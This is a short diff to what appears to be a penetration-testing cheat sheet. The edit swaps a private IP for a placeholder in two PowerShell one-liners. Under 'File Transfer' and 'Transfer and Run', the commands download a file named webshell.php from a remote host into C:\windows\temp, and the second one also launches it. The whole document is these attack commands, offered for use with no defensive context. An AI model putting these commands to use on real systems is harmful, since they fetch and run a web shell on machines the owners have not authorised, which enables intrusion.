@@ -1,8 +1,8 @@
 File Transfer:
 
-PowerShell (New-Object System.Net.WebClient).DownloadFile('http://192.168.1.21/webshell.php','C:\windows\temp\webshell.php');
+PowerShell (New-Object System.Net.WebClient).DownloadFile('http://X.X.X.X/webshell.php','C:\windows\temp\webshell.php');
 
 Transfer and Run:
 
-PowerShell (New-Object System.Net.WebClient).DownloadFile('http://192.168.1.21/webshell.php','C:\windows\temp\webshell.php');Start-Process 'webshell.php'
+PowerShell (New-Object System.Net.WebClient).DownloadFile('http://X.X.X.X/webshell.php','C:\windows\temp\webshell.php');Start-Process 'webshell.php'
 
